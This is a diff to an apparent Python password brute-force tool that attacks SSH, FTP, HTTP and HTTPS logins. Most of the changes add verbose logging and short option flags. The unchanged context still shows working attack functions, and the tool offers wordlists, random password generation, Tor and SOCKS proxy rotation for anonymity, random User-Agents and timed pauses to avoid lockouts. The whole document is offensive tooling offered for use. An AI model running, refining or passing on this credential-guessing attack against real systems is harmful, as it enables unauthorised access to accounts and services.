@@ -63,6 +63,7 @@ def current_timestamp():
 # Modified password generator to support a range of lengths for --rand
 def generate_random_password_list(num_passwords=100000, min_length=8, max_length=18):
     characters = string.ascii_letters + string.digits + "!@#$%^&*"
+    verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Generating password list...", level=2)
     passwords = set()
 
     while len(passwords) < num_passwords:
@@ -80,9 +81,10 @@ def extract_domain(ip_with_path):
     parsed_url = urlparse(f"https://{ip_with_path}")
     return parsed_url.netloc
 
-def verbose_print(message):
-    if args.verbose:
+def verbose_print(message, level=1):
+    if args.verbose and args.verbose >= level:
         print(message)
+
 def is_service_running(ip_with_path, port, service, retries=3, delay=2):
     ip = extract_domain(ip_with_path)
     verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}Checking if {service.upper()} service is running on {ip}:{port}")# Extract the domain
@@ -123,6 +125,7 @@ def is_service_running(ip_with_path, port, service, retries=3, delay=2):
 
 
 def is_http_service_running(url):
+    verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Checking if service running...", level=2)
     try:
         response = requests.get(url, timeout=30)
         return response.status_code == 200
@@ -143,6 +146,7 @@ def set_up_tor():
             old_ip = get_public_ip()
             socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
             socket.socket = socks.socksocket
+            verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Socks.proxy - localhost:9050", level=2)
             new_ip = get_public_ip()
             print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Old IP: {Fore.LIGHTBLUE_EX}{old_ip}")
             print(
@@ -161,6 +165,7 @@ def set_up_tor():
 
 def get_public_ip():
     try:
+        verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Request for IP - https://api.ipify.org", level=2)
         response = requests.get('https://api.ipify.org')
         return response.text
     except requests.RequestException:
@@ -197,19 +202,19 @@ def load_progress():
         with open(STATE_FILE, 'r') as f:
             return json.load(f)
     else:
-        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED}No progress file found. Starting from the beginning.{Fore.RESET}")
+        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} No progress file found. Starting from the beginning.{Fore.RESET}")
         return None
 
 
 def delete_progress_file():
     if os.path.exists(STATE_FILE):
         os.remove(STATE_FILE)
-        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.YELLOW}Progress file deleted.{Fore.RESET}")
+        print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.YELLOW} Progress file deleted.{Fore.RESET}")
 
 
 def parse_arguments():
     parser = argparse.ArgumentParser(description='Brute force against SSH and FTP services.')
-    parser.add_argument('--service', nargs='+', required=True,
+    parser.add_argument('-sv', '--service', nargs='+', required=True,
                         help="Service to attack. (http,ftp,ssh) OPTIONAL: port number (ssh 2222, http 8080)")
 
     group = parser.add_mutually_exclusive_group(required=True)
@@ -223,14 +228,14 @@ def parse_arguments():
 
     parser.add_argument('--ip', required=True, type=str, help="IP address of the target.")
     parser.add_argument('--tor', action='store_true', help="Use Tor for anonymization")
-    parser.add_argument('--proxies', type=str, help="File containing a list of proxies.")
+    parser.add_argument('-px', '--proxies', type=str, help="File containing a list of proxies.")
     parser.add_argument('-i', '--iterations', type=int, default=3, choices=range(3, 10),
                         help="Number of attempts per username (default: 3)")
 
     # Added new arguments
     parser.add_argument('--resume', action='store_true', help="Resume from the last state.")
-    parser.add_argument('--verbose', action='store_true', help="Enable verbose output for detailed attack logs.")
-    parser.add_argument('--random-agent', action='store_true', help="Use random User-Agent strings for HTTP attacks.")
+    parser.add_argument('--verbose', '-v', nargs='?', type=int, choices=[1, 2], const=1, default=0, help='Verbose level (1 or 2)')
+    parser.add_argument('-ra', '--random-agent', action='store_true', help="Use random User-Agent strings for HTTP attacks.")
 
     parser.add_argument('--http-post', type=str, help="HTTP POST form parameters.")
     parser.add_argument('--success-content-length', type=int, help="Content length indicating successful login.")
@@ -238,7 +243,7 @@ def parse_arguments():
     parser.add_argument('--success-pattern', type=str, help="Pattern indicating a successful login.")
     parser.add_argument('--failure-pattern', type=str, help="Pattern indicating a failed login.")
     parser.add_argument('-ss', '--sessions', action=store_true, help="Force new sessions")
-    parser.add_argument('--pause', nargs=2, type=int, metavar=('MINUTES_BEFORE_PAUSE', 'PAUSE_DURATION'),
+    parser.add_argument('-ps', '--pause', nargs=2, type=int, metavar=('MINUTES_BEFORE_PAUSE', 'PAUSE_DURATION'),
                         help='Pause the attack after the first specified number of minutes and pause for the second specified number of minutes.')
 
     args = parser.parse_args()
@@ -265,8 +270,17 @@ def parse_arguments():
     elif len(args.service) == 1:
         args.service = args.service[0]
 
+    if args.verbose not in [1, 2, 0]:
+        raise ValueError("Invalid value for --verbose. Only 1 or 2 are allowed.")
+
     if args.user and args.users:
         parser.error("You cannot use both -u and --users together. Choose one.")
+
+    if args.random_agent and args.service not in ['http', 'https']:
+        print(f"{Fore.WHITE}[{Fore.YELLOW}ALERT{Fore.WHITE}]{Fore.RESET} Random agent module is meant for HTTP(S) attacks.")
+
+    if args.sessions and args.service not in ['http', 'https']:
+        print(f"{Fore.WHITE}[{Fore.YELLOW}ALERT{Fore.WHITE}]{Fore.RESET} Session module is meant for HTTP(S) attacks.")
 
         # Handle --users as a file containing usernames
     if args.users:
@@ -291,6 +305,7 @@ def save_to_file(ip, service, user, password, attempt_count):
 
 
 def test_ssh_auth_type(ip):
+    verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Testing SSH auth type", level=2)
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
@@ -315,6 +330,7 @@ def test_ssh_auth_type(ip):
 
 
 def cycle_through_proxies(proxies):
+    verbose_print("{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Cycling proxies", level=2)
     i = 0
     while True:
         yield proxies[i]
@@ -324,6 +340,7 @@ def cycle_through_proxies(proxies):
 def http_attack(ip, user, password, http_post_params, success_pattern, failure_pattern, success_content_length=None,
                 failure_content_length=None, proxy_ip=None, proxy_port=None):
     if proxy_ip and proxy_port:
+        verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Proxy {proxy_ip}:{proxy_port}")
         socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_ip, int(proxy_port))
         socket.socket = socks.socksocket
 
@@ -334,38 +351,38 @@ def http_attack(ip, user, password, http_post_params, success_pattern, failure_p
         if args.random_agent:
             selected_agent = random.choice(USER_AGENTS)
             headers['User-Agent'] = selected_agent
-            verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}Using random User-Agent: {selected_agent}")
+            verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Using random User-Agent: {selected_agent}", level=1)
 
         data = http_post_params.replace('^USER^', user).replace('^PASS^', password)
-        verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}Sending HTTP POST request to {ip} with data: {data}")
+        verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Sending HTTP POST request to {ip} with data: {data}", level=1)
         response = requests.post(f"http://{ip}", data=data, headers=headers, timeout=5, verify=False)
         response_length = len(response.content)
-        verbose_print(f"{Fore.WHITE}[{Fore.CYAN}HTTP-CONTENT-LENGTH{Fore.WHITE}]{Fore.RESET}: {len(response.content)}\n")
-        verbose_print(f"{Fore.WHITE}[{Fore.CYAN}HTTP-RESPONSE{Fore.WHITE}]{Fore.RESET}: \n{response.text[:2000]}")
+        verbose_print(f"{Fore.WHITE}[{Fore.CYAN}CONTENT-LENGTH{Fore.WHITE}]{Fore.RESET}: {len(response.content)}\n", level=1)
+        verbose_print(f"{Fore.WHITE}[{Fore.CYAN}HTTP-RESPONSE{Fore.WHITE}]{Fore.RESET}: \n{response.text[:2000]}", level=1)
 
         if failure_content_length is not None and response_length == failure_content_length:
             return False  # Indicates failure
 
         if failure_content_length is not None and response_length != failure_content_length:
-            print(current_timestamp(),
-                  f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
+            verbose_print(
+                  f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}", level=1)
             return True  # Indicates success
 
         if success_content_length is not None and response_length == success_content_length:
-            print(current_timestamp(),
-                  f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
+            verbose_print(
+                  f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}", level=1)
             return True  # Indicates success
 
         if success_pattern and success_pattern in response.text:
-            print(current_timestamp(),
-                  f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
+            verbose_print(
+                  f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}", level=1)
             return True  # Indicates success
 
         if failure_pattern and failure_pattern in response.text:
             return False  # Indicates failure
 
-        print(
-            f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Unidentified response for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.YELLOW}{password}")
+        verbose_print(
+            f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Unidentified response for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.YELLOW}{password}", level=1)
         return None
 
     except requests.RequestException as e:
@@ -382,6 +399,7 @@ def https_attack(ip, user, password, https_post_params, success_pattern, failure
     """ Perform an HTTPS attack by sending POST requests with given parameters."""
 
     if proxy_ip and proxy_port:
+        verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Proxy {proxy_ip}:{proxy_port}", level=2)
         socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_ip, int(proxy_port))
         socket.socket = socks.socksocket
 
@@ -392,7 +410,7 @@ def https_attack(ip, user, password, https_post_params, success_pattern, failure
         if args.random_agent:
             selected_agent = random.choice(USER_AGENTS)
             headers['User-Agent'] = selected_agent
-            verbose_print(f"Using random User-Agent: {selected_agent}")
+            verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Using random User-Agent: {selected_agent}", level=1)
 
         # Replace placeholders in the POST data
         data = https_post_params.replace('^USER^', user).replace('^PASS^', password)
@@ -402,8 +420,8 @@ def https_attack(ip, user, password, https_post_params, success_pattern, failure
         response_length = len(response.content)
 
         # Print out content length and first 2000 characters of response for verbose output
-        verbose_print(f"{Fore.WHITE}[{Fore.CYAN}HTTPS-CONTENT-LENGTH{Fore.WHITE}]{Fore.RESET}: {response_length}\n")
-        verbose_print(f"{Fore.WHITE}[{Fore.CYAN}HTTPS-RESPONSE{Fore.WHITE}]{Fore.RESET}: \n{response.text[:2000]}")
+        verbose_print(f"{Fore.WHITE}[{Fore.CYAN}CONTENT-LENGTH{Fore.WHITE}]{Fore.RESET}: {response_length}\n", level=1)
+        verbose_print(f"{Fore.WHITE}[{Fore.CYAN}HTTPS-RESPONSE{Fore.WHITE}]{Fore.RESET}: \n{response.text[:2000]}", level=1)
 
         # Failure based on content length
         if failure_content_length is not None and response_length == failure_content_length:
@@ -412,13 +430,13 @@ def https_attack(ip, user, password, https_post_params, success_pattern, failure
         # Success based on content length
         if success_content_length is not None and response_length == success_content_length:
             verbose_print(
-                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for user {user} with password: {password}")
+                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for user {user} with password: {password}", level=1)
             return True  # Indicates success
 
         # Success based on pattern match in response body
         if success_pattern and success_pattern in response.text:
             verbose_print(
-                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for user {user} with password: {password}")
+                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for user {user} with password: {password}", level=1)
             return True  # Indicates success
 
         # Failure based on pattern match in response body
@@ -427,7 +445,7 @@ def https_attack(ip, user, password, https_post_params, success_pattern, failure
 
         # If none of the patterns matched, return None (uncertain)
         verbose_print(
-            f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Unidentified response for user {user} with password: {password}")
+            f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.RED} Unidentified response for user {user} with password: {password}", level=1)
         return None
 
     except requests.RequestException as e:
@@ -441,11 +459,15 @@ def https_attack(ip, user, password, https_post_params, success_pattern, failure
 
 def ssh_attack(ip, port, user, password, proxy_ip=None, proxy_port=None):
     client = paramiko.SSHClient()
+    verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Paramiko SSHClient - {ip}", level=2)
+
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     if proxy_ip and proxy_port:
+        verbose_print(f"Proxy {proxy_ip}:{proxy_port}")
         socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_ip, int(proxy_port))
         socket.socket = socks.socksocket
     try:
+        verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} SSHClient connect {ip}", level=1)
         client.connect(ip, port=int(port), username=user, password=password, timeout=5)
         print(
             f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Success for [*]{Fore.YELLOW}{user}{Fore.RESET}[*]:{Fore.GREEN}{password}")
@@ -493,7 +515,9 @@ def ssh_attack(ip, port, user, password, proxy_ip=None, proxy_port=None):
 
 
 def ftp_attack(ip, user, password, proxy_ip=None, proxy_port=None):
+    verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} FTP attack - ftplib - attacking {ip}", level=1)
     if proxy_ip and proxy_port:
+        verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Proxy {proxy_ip}:{proxy_port}", level=2)
         socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_ip, int(proxy_port))
         socket.socket = socks.socksocket
     try:
@@ -578,9 +602,9 @@ def get_port(args):
         return None
 
 def pause_attack(pause_after_minutes, pause_duration_minutes):
-    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Pausing attack for {pause_duration_minutes} minutes.")
+    verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Pausing attack for {pause_duration_minutes} minutes.", level=1)
     time.sleep(pause_duration_minutes * 60)  # Sleep for pause_duration_minutes in seconds
-    print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Resuming attack after {pause_duration_minutes} minutes.")
+ 
 
 
 if __name__ == '__main__':
@@ -596,7 +620,9 @@ if __name__ == '__main__':
         port = get_port(args)
         pause_after_minutes = None
         pause_duration_minutes = None
+
         if args.pause:
+            verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Pause module loaded", level=2)
             pause_after_minutes = args.pause[0]
             pause_duration_minutes = args.pause[1]
             next_pause_time = time.time() + pause_after_minutes * 60  # Calculate when to trigger the pause
@@ -618,6 +644,7 @@ if __name__ == '__main__':
                     break
 
         if args.rand:
+            verbose_print(f"Random passwords with min: {min_length} and max: {max_length}", level=2)
             min_len = args.rand[0]
             max_len = args.rand[1]
             args.wordlist = generate_random_password_list(min_length=min_len, max_length=max_len)
@@ -663,7 +690,7 @@ if __name__ == '__main__':
         if args.resume:
             saved_state = load_progress()
             if saved_state:
-                print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.YELLOW}Resuming from the last saved state...{Fore.RESET}")
+                print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.YELLOW} Resuming from the last saved state...{Fore.RESET}")
                 attempt_count = saved_state['attempt_count']
                 passwords = saved_state['remaining_passwords']
                 users = saved_state['remaining_users']
@@ -681,8 +708,10 @@ if __name__ == '__main__':
             for idx, user in enumerate(users):
                 if pause_after_minutes and time.time() >= next_pause_time:
                     pause_attack(pause_after_minutes, pause_duration_minutes)
+                    verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Pausing every {pause_after_minutes} for {pause_duration_minutes}", level=2)
                     next_pause_time = time.time() + pause_after_minutes * 60  # 
-                if args.session:
+                if args.sessions:
+                    verbose_print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Session module loaded.", level=2)
                     if len(users) > 1 and idx == 0:  # First user in list case
                         print(f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Creating a new session for the first user: {user}")
                         session = create_new_session()  # Your session creation logic here
@@ -773,9 +802,10 @@ if __name__ == '__main__':
                                   f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Password found for [*]{user}[*] in [{time_elapsed:.2f} seconds] with [{attempt_count} tries]. PASS = {Fore.BLUE}{password} ")
                             break
                         else:
-                            print(
-                                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Failed attempt for user {Fore.YELLOW}{user}{Fore.RESET} with pass: {Fore.YELLOW}{password}")
-                            time.sleep(0.3)
+                            verbose_print(
+                                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Failed attempt for user {Fore.YELLOW}{user}{Fore.RESET} with pass: {Fore.YELLOW}{password}", level=1)
+                            
+                      
                     elif 'https' in service:
                         if not args.http_post:
                             raise ValueError(
@@ -797,6 +827,10 @@ if __name__ == '__main__':
                             print(current_timestamp(),
                                   f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET}{Fore.GREEN} Password found for [*]{user}[*] in [{time_elapsed:.2f} seconds] with [{attempt_count} tries]. PASS = {Fore.BLUE}{password}")
                             break  # Go to the next user
+                        else:
+                            verbose_print(
+                                f"{Fore.WHITE}[{Fore.YELLOW}INFO{Fore.WHITE}]{Fore.RESET} Failed attempt for user {Fore.YELLOW}{user}{Fore.RESET} with pass: {Fore.YELLOW}{password}", level=1)
+                            
                 save_progress(attempt_count, user, password, users[idx:], passwords[i + j + 1:])
             first_iteration = False
 
